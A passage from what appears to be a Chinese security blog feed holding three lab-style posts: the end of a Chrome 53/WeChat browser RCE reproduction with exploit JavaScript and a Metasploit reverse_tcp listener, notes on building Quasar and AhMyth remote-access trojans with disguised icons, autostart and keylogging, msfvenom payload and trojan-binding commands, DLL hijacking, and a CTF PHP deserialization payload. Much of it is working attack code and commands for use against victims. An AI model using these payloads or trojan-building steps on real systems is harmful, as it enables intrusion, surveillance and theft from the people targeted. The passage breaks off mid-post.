<span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>prevent_opt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setBytes</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> content<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">write8</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">,</span> content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> oob <span class="token operator">=</span> <span class="token function">oobAccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> func_ptr <span class="token operator">=</span> oob<span class="token punctuation">.</span><span class="token function">leakPtr</span><span class="token punctuation">(</span>target_function<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'[*] target_function at 0x'</span> <span class="token operator">+</span> func_ptr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> kCodeInsOffset <span class="token operator">=</span> <span class="token number">0x1b</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> code_addr <span class="token operator">=</span> oob<span class="token punctuation">.</span><span class="token function">read32</span><span class="token punctuation">(</span>func_ptr <span class="token operator">+</span> kCodeInsOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'[*] code_addr at 0x'</span> <span class="token operator">+</span> code_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oob<span class="token punctuation">.</span><span class="token function">setBytes</span><span class="token punctuation">(</span>code_addr<span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">target_function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token number">0</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"start running"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行网页服务，同时利用msf配置文件启动到监听模式<code>msf -r msf_start</code></p><p>msf启动配置文件：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.90.124set LPORT 443run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送链接给目标靶机（安装了Wechat 3.0.0）</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210718003653.png" alt="image-20210717230251924"></p><p>在靶机上点击访问chrome版本检测网页，可以看到一个重要的参数–no-sanbox，结合chromium版本为53，由此可以判断其存在相应的漏洞。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210718003650.png" alt="image-20210717230316715"></p><p>在该客户端上访问我们构建的链接，等待网页加载完毕：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210718003639.png" alt="image-20210717230535304"></p><p>回到我们的攻击机上，可以看到msf中靶机上线了，我们可以进行简单的dir目录查询。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210718003627.png" alt="image-20210717230448828"></p><p>进一步我们可以查询sysinfo，查看系统信息，并且获取系统shell</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210718003526.png" alt="image-20210717230618778"></p><p>到这里RCE的复现就完成了，其实靶机在MSF中上线后，就可以进行很多操作了，具体操作可以自行查找MSF后渗透利用。</p><h1 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&amp;mid=2657042035&amp;idx=1&amp;sn=311dd80bdde8a6dace3a26a225fdaa1d&amp;chksm=803fdeadb74857bb54f5049e1255b163c2b78bd5637764a4be0a6de2fd95f87e55426d5b72c5&amp;mpshare=1&amp;scene=23&amp;srcid=0424lC0UdTRxaMTABghI2ZGu&amp;sharer_sharetime=1619228320246&amp;sharer_shareid=cc636dec2a7835ac914d744a4f90d31b#rd">https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&amp;mid=2657042035&amp;idx=1&amp;sn=311dd80bdde8a6dace3a26a225fdaa1d&amp;chksm=803fdeadb74857bb54f5049e1255b163c2b78bd5637764a4be0a6de2fd95f87e55426d5b72c5&amp;mpshare=1&amp;scene=23&amp;srcid=0424lC0UdTRxaMTABghI2ZGu&amp;sharer_sharetime=1619228320246&amp;sharer_shareid=cc636dec2a7835ac914d744a4f90d31b#rd</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;4月份有一个Chrome的RCE 0day闹得沸沸扬扬，吓得我是赶紧就升级到了最新的Chrome，但是其实低版本Chrome也并非就非常危险</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit系列笔记</title>
    <link href="http://yoursite.com/post/Metasploit%E7%B3%BB%E5%88%97%E7%AC%94%E8%AE%B0.html"/>
    <id>http://yoursite.com/post/Metasploit%E7%B3%BB%E5%88%97%E7%AC%94%E8%AE%B0.html</id>
    <published>2021-07-06T15:28:43.000Z</published>
    <updated>2021-08-25T08:38:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>Metasploit大家应该都很熟悉了，我也有用过，但是之前也就是浅薄的去学习一些简单的使用方法，并没有细致地去了解和学习这个攻击框架，现在算是补课吧，利用暑假的时间补补课吧。</p><h1 id="Windows-木马工具"><a href="#Windows-木马工具" class="headerlink" title="Windows 木马工具"></a>Windows 木马工具</h1><p>先来学习一下一个Windows木马生成工具，名字叫做quasar，他在github上有项目可以直接下载，github项目地址:<a href="https://github.com/quasar/Quasar%EF%BC%8CWindows%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF.exe%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%8C%E6%93%8D%E4%BD%9C%E7%AE%80%E5%8D%95%EF%BC%8C%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E4%BD%BF%E7%94%A8%E4%BA%86%E3%80%82">https://github.com/quasar/Quasar，Windows下直接就是.exe执行文件，操作简单，生成证书后就可以打开使用了。</a></p><p>打开quasar后可以生成和监听，首先来看监听，监听的话打开setting，进行设置监听端口，这个就类似于listing xxx端口了，点击开始监听就开始监听相关端口了。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181059.png" alt="image-20210706235817966"></p><p>下面看看木马的构建，首先是basic setting可以设置tag方便标识，还可以设置mutec（用guid来表示程序）是未来防止木马进程多次启动，连接设置中设置木马连接的主机和端口。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181057.png" alt="image-20210707194244577"></p><p>在installation设置中可以设置是否开机自启，并且可以自定义启动项名称，这里的Quasar Client Startup是默认的名称，可以自行修改。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181054.png" alt="image-20210707194449605"></p><p>这里还有一个安装选项，选上安装选项后，点击木马后不仅会添加启动项，而且还会安装到系统中，其中选项有设置文件属性伪隐藏，类似于使用命令<code>attrib +h xxx.exe</code>，这将会起到隐藏文件的作用，如果需要解除隐藏则使用<code>attrib -h xxx.exe</code>即可。</p><p>接下来在Assembly设置中可以选择一个伪造的图标，以便于更加具有迷惑性。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181051.png" alt="image-20210707213403222"></p><p>在monitoring设置中还可以开启键盘按键记录功能，通过此功能可以获取被害人的输入信息，甚至获得密码等敏感信息。</p><p>通过一些手段，将该木马程序传入被害者电脑，并且诱导被害者点击运行程序。一旦被害者点击，木马程序即开始运行并且加入自启动项。作为攻击者端，就会看到目标主机上线了，并且可以对其进行一些程序执行、文件管理、进程查看等等一系列操作。但是也有一点必须要注意，使用quasar生成的木马是基于.net 4 framework的，所以必须要拥有相关环境，才能正常运行木马，否则会报错。</p><p>通过上面的设置我们可以伪造一个QQ样式的图标，他的欺骗性就大大提高了。</p><p>下面进行测试，在拥有可用.net环境的Windows 10系统上进行木马测试。首先我先要把这个伪装的木马放到目标靶机上。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181045.png" alt="image-20210708173013523"></p><p>双击运行这个人畜无害的QQ，就开始运行我们的木马了。我们也可以通过任务管理器看到这一点。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181040.png" alt="image-20210708173421096"></p><p>再回到我们的攻击机，可以发现攻击机上已经可以，看到靶机上线了。同时我们可以看到这台靶机的相关信息，用户名计算机号，系统版本，地区都可以被看到。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181038.png" alt="image-20210708173539545"></p><p>下面我们开始利用木马进行攻击，首先可以进行信息收集，查看详细的系统信息。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181036.png" alt="image-20210708173905891"></p><p>可以利用文件管理器，访问目标靶机的文件系统，并且上传和下载文件，删除执行，这都是可以实现的。通过木马还可以实现更多的系统管理功能，例如系统自启动项目，任务管理器，TCP连接情况，注册表修改，关机重启，反向代理，远程程序执行等操作。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181030.png" alt="image-20210708174334159"></p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181028.png" alt="image-20210708174405120"></p><p>下面重点来看一个有用的东西远程shell，命令执行真的就是爽歪歪。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181025.png" alt="image-20210708174758479"></p><p>远程程序执行也是一个有点意思的点，再quasar中选择本地的可执行文件或者在线的可执行文件，即可在靶机上执行了。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181013.png" alt="image-20210708175028681"></p><p>回到靶机看一下，他就已经运行起来了。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181005.png" alt="image-20210708175116511"></p><p>并且我们还可以记录靶机用户的键盘输入信息，从而一定的课程获取敏感信息，对用户有监听作用。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181002.png" alt="image-20210708175708330"></p><p>还可以进行图形化的远程连接，并且该连接时靶机端并不会出现异常依旧正常显示。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708180913.png" alt="image-20210708175908144"></p><p>甚至还可以弹窗信息，推送想要推送的信息。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210708180857.png" alt="image-20210708180025940"></p><p>但是如何放置到目标靶机上还是有难度的，目前我想法的话，应该是要结合社会工程学手段才行，或者一些其他手段诱导下载到用户本地。</p><h1 id="Android木马工具"><a href="#Android木马工具" class="headerlink" title="Android木马工具"></a>Android木马工具</h1><p>Android木马使用AhMyth-Android-RAT项目，他的github项目地址为<a href="https://github.com/AhMyth/AhMyth-Android-RAT">AhMyth/AhMyth-Android-RAT: Android Remote Administration Tool (github.com)</a></p><p>该项目提供了Windows版本和Linux版本。我这里直接下载该项目的二进制版本，直接就可以使用了。</p><p>图形化工具使用起来也是较为简单，和Windows木马工具一样上来也是设置监听的端口号时什么，默认是监听42474端口来实现的。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210709001425.png" alt="image-20210708232318132"></p><p>下面来看一下简单的木马构建过程，也很简单输入IP和端口，这个和之前是一样的。然后直接点击build即可生成一个apk文件。<strong>注意：AhMyth不支持最新的JDK，所以要使用就必须要使用JDK 8才能构建木马</strong></p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210709001421.png" alt="image-20210708234210675"></p><p>可以在相应的路径下找到它，下面我将其安装到我的安卓模拟器上进行实验，很遗憾的是可能是由于Android SDK的原因，我的模拟器上运行该木马apk后，PC机上并没有接收到上线通知，可以说是没有成功了，但是Android系统就是如此，其为了安全性进行了严格权限管理，并且API版本众多SDK版本也众多，在实战下还是会又很大的概率遇到该问题的，这就需要具有安卓开发能力了，毕竟工具只能做到这里了。</p><p>还可以将其隐藏到其他的应用中去，这样就可以很好的解决授权问题，因为某些软件用户一定会给予其一定的权限。虽然没有成功，但是工具确实也是好工具，值得收藏一下。</p><h1 id="MSF木马配置"><a href="#MSF木马配置" class="headerlink" title="MSF木马配置"></a>MSF木马配置</h1><p>基础用法:<code>show options</code>展示选项。<code>set LHOST xxx.xxx.xxx.xxx</code>这是设置相关选项的方法。</p><p><code>msfconsole -q</code>不带banner信息的快速启动。</p><p>调用exploit/multi/handler模块<code>use exploit/multi/handler</code></p><p>通过<code>set payload xxxx/xxx/xxx/</code>来设置使用的payload</p><p>这是msf端需要的操作。</p><pre class="line-numbers language-none"><code class="language-none">msfconsole -quse exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.51.124set LPORT 4444run&#x2F;exploitmeterpreter&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>x86简单后门生成：</p><p><strong>下面使用msfvenom来生成木马</strong></p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f exe -a x86 --platform windows -o .&#x2F;meter_re_tcp_x86.exe LHOST&#x3D;192.168.51.124 LPORT&#x3D;4444#其中-f format表示木马格式#-p为payload#-a 表示芯片架构#--platfor表示系统类型#-o为生成位置#更多的使用选项可以直接-h查看。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210709235407.png" alt="image-20210709232715120"></p><p>在msf上使用run命令开始监听，同时把生成的木马放进靶机里运行，msf成功上线木马。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210709235417.png" alt="image-20210709233108401"></p><h1 id="MSF木马VBS配置"><a href="#MSF木马VBS配置" class="headerlink" title="MSF木马VBS配置"></a>MSF木马VBS配置</h1><p>Windows VBS脚本生成，依旧是和上面的生成方式类似。</p><p>只有涉及到上面说过的这个-f参数也就是format，只要设置为vbs格式就ok了</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f vbs -a x86 --platform windows -o .&#x2F;meter_re_tcp_x86.vbs LHOST&#x3D;192.168.51.124 LPORT&#x3D;4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>至于想要知道各个参数有哪些个可选项，就可以利用-l命令加上选项全称来进行查询，例如这里我要知道-f参数都支持哪些就用命令<code>msfvenom -l format</code>来查询。</p><p>为了方便也可以使用shell脚本来一件生成，其实本质就是把命令写成shell而已了。但是相比每次输入命令来生成，直接运行shell来生成确实是方便了不少了。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">arch</span><span class="token operator">=</span>x86<span class="token assign-left variable">format</span><span class="token operator">=</span>vbs<span class="token assign-left variable">platform</span><span class="token operator">=</span>windows<span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">4444</span><span class="token assign-left variable">HOST</span><span class="token operator">=</span><span class="token number">192.168</span>.3.78<span class="token assign-left variable">out</span><span class="token operator">=</span>./meter_re_tcp_x86.vbs<span class="token assign-left variable">paylaod</span><span class="token operator">=</span>windows/meterpreter/reverse_tcpmsfvenom -p <span class="token variable">$paylaod</span> -f <span class="token variable">$format</span> -a <span class="token variable">$arch</span> --platform <span class="token variable">$platform</span> -o <span class="token variable">$out</span> <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$HOST</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token variable">$PORT</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一键就可以生成了，同时还可以配置一个文件用来一键启动MSF监听，也可以剩下非常多的重复步骤。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.3.78set LPORT 4444run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是利用了metasploit自己提供的一个功能，可以提前将命令写入一个文件，类似与配置文件，然后使用-r命令自动加载。</p><p>下面我们就使用上面的shell脚本先生成一个x86的vbs木马。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200627.png" alt="image-20210710194036325"></p><p>木马生成后，还是将其放入到实验靶机上，结合msf的一键启动监听脚本来使用。</p><p><code>msfconsole -r msf_start</code>即可启动到监听。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200636.png" alt="image-20210710194659980"></p><p>成功到达监听处，此时和之前一样在Windows上执行vbs文件，就可以在系统上成功监听到PC的上线。并且我们可以在系统上创建文件和文件夹都是可以实现的。但是这个直接生成的vbs脚本在Windows10系统上使用Windows Defender去扫描，它居然没有报毒，但是好在执行的时候，其还是检测到了其的木马行为。所以这种直接生成的木马在实战中并不能直接使用，因为杀软会直接处理了它，所以还需要更多的加工才能够有较好的效果。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200639.png" alt="image-20210710195501079"></p><p>现在我们回过头来看看生成的vbs脚本是如何写的。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200643.png" alt="image-20210710195840281"></p><p>首先是这部分代码，是一个函数，可以看出主要是创建了一个XML对象，并且对默写字符串进行了一个解base64的处理，然后写入到对象数据吧。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200645.png" alt="image-20210710200036419"></p><p>下面这部分则是另一个函数，在这个函数中，调用了上面的那个base64解码函数，对第一句的字符串进行解码，然后把解码结果写入到了一个文件并且将其保存，然后就会去执行这个文件，再将其删除。也就是说加载到内存中即删除原有木马文件。我们无法从该木马文件中直接看到恶意语句，因为其做了一个混淆的工作。</p><p>简单的异常木马vbs文件，关注这几个点，如果它又创建写入文件并且执行，还紧跟这一个删除文件的操作，就很有可能是有问题的。</p><h1 id="MSF木马捆绑"><a href="#MSF木马捆绑" class="headerlink" title="MSF木马捆绑"></a>MSF木马捆绑</h1><p>木马捆绑可以提升他的混淆性，被捆绑文件依旧可以正常执行，但是恶意代码也会同时执行。</p><p>我们可以尝试使用-x参数来将恶意木马捆绑到其他文件上。稍微改一改之前的脚本。</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">arch&#x3D;x86format&#x3D;exeplatform&#x3D;windowsPORT&#x3D;4444HOST&#x3D;192.168.3.78out&#x3D;冰点下载器_3.2.16.0125_Single.exepaylaod&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcpx&#x3D;&#x2F;home&#x2F;a1andns&#x2F;test&#x2F;冰点下载器_3.2.16.0125_Single.exemsfvenom -p $paylaod -f $format -a $arch --platform $platform -o $out -x $x LHOST&#x3D;$HOST LPORT&#x3D;$PORT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在kali上运行脚本来捆绑木马。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210711200422.png" alt="image-20210711193524262"></p><p>将绑定的exe文件放入到虚拟机里头。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210711200427.png" alt="image-20210711194903059"></p><p>在Windows运行成功上线，当原有程序并没有成功运行，怀疑是程序启动的入口被修改为了恶意木马的地址。但是因为其过于暴露，目前的杀软基本都可以成功检测出他的恶意行为。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210711200433.png" alt="image-20210711195925748"></p><h1 id="MSF木马DLL"><a href="#MSF木马DLL" class="headerlink" title="MSF木马DLL"></a>MSF木马DLL</h1><p>DLL是动态链接库文件，生成方式与上面相同，只需要修改format格式为dll即可生成一个dll文件。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210825163834.png" alt="image-20210720211652469"></p><p>然后如何来利用dll，首先dll是不能够直接双击运行的，一般来说它是被应用程序调用的，那么如何我将其名字改为某个程序需要调用的dll名称，或者系统dll名称，那么在执行某个程序的同时就可以调用到这个恶意dll文件。亦或者使用rundll32 命令直接运行（一般来说没有人会去这么做）。</p><p>可以使用生成的dll来替代某个应用启动需要的dll文件，就可以让木马利用更加友好</p><h1 id="MSF劫持DLL"><a href="#MSF劫持DLL" class="headerlink" title="MSF劫持DLL"></a>MSF劫持DLL</h1><p>这就是上面说的利用生成的dll来替代某个应用启动需要的dll文件。这里可以使用一个工具名称为AheadLib，可以帮助我们进行DLL hijack，它能够根据我们需要劫持dll文件生成cpp文件，我们修改添加一个调用我们的shell.dll文件，这样就编译在替换原来的dll文件，就可以让程序调用原有名称的这个dll时去调用我们的恶意dll文件。但是这款工具有点老了似乎只能由于x86，对于64为的x64程序似乎不兼容，但是Github上目前也有一些改进版本支持了x64架构。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210825163826.png" alt="image-20210824135329290"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Metasploit大家应该都很熟悉了，我也有用过，但是之前也就是浅薄的去学习一些简单的使用方法，并没有细致地去了解和学习这个攻击框架，现在算是补课吧，利用暑假的时间补补课吧。&lt;/p&gt;
&lt;h1 id=&quot;Windows-木马工具&quot;&gt;&lt;a href=&quot;#Windows-木马工具</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="MSF" scheme="http://yoursite.com/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2021-pop链</title>
    <link href="http://yoursite.com/post/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pop%E9%93%BE.html"/>
    <id>http://yoursite.com/post/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pop%E9%93%BE.html</id>
    <published>2021-06-28T15:34:20.000Z</published>
    <updated>2021-07-06T15:27:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯2021-pop链"><a href="#强网杯2021-pop链" class="headerlink" title="强网杯2021-pop链"></a>强网杯2021-pop链</h1><p>起初以为pop链是固定的，没有想到还是随机生成的，而且为了混淆16W行也是够狠的。</p><p>这题后来看了题解是使用一个工具来进行pop链的寻找的，这里我用来笨办法，手动看就是废时间，还需要运气，也算是拿了个八血。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze6b0758ddkfbdqshq6.cloudeci1.ichunqiu.com&#x2F;?pop&#x3D;O:6:&quot;oc3cR2&quot;:1:&#123;s:7:&quot;eoGmbyU&quot;;O:6:&quot;P68f9C&quot;:1:&#123;s:7:&quot;FGDnExd&quot;;O:6:&quot;xzpdu7&quot;:1:&#123;s:7:&quot;tMrEI65&quot;;O:6:&quot;NeGUzW&quot;:1:&#123;s:7:&quot;IxYA4YN&quot;;O:6:&quot;ccTQVZ&quot;:1:&#123;s:7:&quot;zlM26BV&quot;;O:6:&quot;w4a1lw&quot;:1:&#123;s:7:&quot;mtUBllc&quot;;O:6:&quot;onRaRG&quot;:1:&#123;s:7:&quot;rvA7BSB&quot;;O:6:&quot;CGpT4s&quot;:1:&#123;s:7:&quot;po41qfC&quot;;O:6:&quot;d4gWv9&quot;:1:&#123;s:7:&quot;UiSXANy&quot;;O:6:&quot;gXUOZX&quot;:1:&#123;s:7:&quot;XdwQRTq&quot;;O:6:&quot;iEfQRF&quot;:1:&#123;s:7:&quot;KRA3QWS&quot;;O:6:&quot;fCnqo4&quot;:1:&#123;s:7:&quot;qSvLUy5&quot;;O:6:&quot;Sg86BZ&quot;:1:&#123;s:7:&quot;LNsywtO&quot;;O:6:&quot;Kyclto&quot;:1:&#123;s:7:&quot;yP0sQDv&quot;;O:6:&quot;HvOSO4&quot;:1:&#123;s:7:&quot;IEXEXgC&quot;;O:6:&quot;nw8rU4&quot;:1:&#123;s:7:&quot;l3RdfVY&quot;;O:6:&quot;S4x3Gm&quot;:1:&#123;s:7:&quot;a7E8Ki4&quot;;O:6:&quot;y709PB&quot;:1:&#123;s:7:&quot;gg7ZGMD&quot;;O:6:&quot;mqeccs&quot;:1:&#123;s:7:&quot;VN0dxHK&quot;;O:6:&quot;wWTYfQ&quot;:1:&#123;s:7:&quot;ERWubTU&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv&#x3D;phpinfo();&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210612125849037.png" alt="image-20210612125849037"></p><pre class="line-numbers language-none"><code 